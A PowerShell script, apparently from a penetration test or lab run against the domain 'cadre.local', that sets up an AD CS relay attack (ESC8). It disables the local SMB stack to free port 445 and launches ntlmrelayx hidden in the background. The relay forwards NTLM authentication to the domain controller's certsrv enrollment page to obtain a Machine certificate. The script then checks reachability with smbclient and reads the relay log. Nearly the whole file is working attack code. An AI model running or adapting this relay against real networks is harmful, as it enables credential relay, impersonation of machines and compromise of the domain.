# Definitive relay reachability test: connect to 192.168.77.62:445 while relay up
$ErrorActionPreference = "Stop"
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

try {
  Write-Output "=== disable SMB stack ==="
  sc.exe config LanmanServer start= disabled | Out-Null
  sc.exe config srv2 start= disabled | Out-Null
  sc.exe config srvnet start= disabled | Out-Null
  Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
  sc.exe stop srv2 | Out-Null
  sc.exe stop srvnet | Out-Null
  Start-Sleep -Seconds 5
  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  if ($c) { throw "445 still bound" }
  Write-Output "445_free"

  Write-Output "=== firewall profile ==="
  Get-NetFirewallProfile | Format-Table Name,Enabled -AutoSize
  Write-Output "=== SMB firewall rules (inbound allow) ==="
  Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayName -match "SMB|File and Printer|445" } |
    Format-Table DisplayName,Profile,Enabled -AutoSize

  Write-Output "=== start relay on 445 ==="
  $relayLog = Join-Path $work "esc8-relay.log"
  Remove-Item $relayLog,(Join-Path $work "esc8-relay.err") -ErrorAction SilentlyContinue
  $relayArgs = "-t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support -ip 192.168.77.62"
  $p = Start-Process -FilePath "python" -ArgumentList "$py\ntlmrelayx.py $relayArgs" -WorkingDirectory $work `
    -RedirectStandardOutput $relayLog -RedirectStandardError (Join-Path $work "esc8-relay.err") `
    -PassThru -WindowStyle Hidden
  Write-Output "relay_pid=$($p.Id)"
  Start-Sleep -Seconds 8

  Write-Output "=== TCP connect test to 192.168.77.62:445 ==="
  $t = Test-NetConnection -ComputerName 192.168.77.62 -Port 445 -WarningAction SilentlyContinue
  Write-Output "tcp_445=$($t.TcpTestSucceeded)"

  Write-Output "=== smbclient to 192.168.77.62:445 ==="
  $env:PYTHONIOENCODING = "utf-8"
  echo "exit" | & python "$py\smbclient.py" //192.168.77.62/ipc$ -no-pass 2>&1 | Select-Object -First 10
  Write-Output "self_rc=$LASTEXITCODE"
  Start-Sleep -Seconds 5

  Write-Output "=== relay log tail ==="
  Get-Content $relayLog -Tail 30 -ErrorAction SilentlyContinue
} finally {
  Stop-Process -Name python -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 1
  sc.exe config LanmanServer start= auto | Out-Null
  sc.exe config srv2 start= demand | Out-Null
  sc.exe config srvnet start= demand | Out-Null
  sc.exe start srvnet | Out-Null
  sc.exe start srv2 | Out-Null
  Start-Sleep -Seconds 2
  Start-Service LanmanServer -ErrorAction SilentlyContinue
  Write-Output "smb_restored"
}
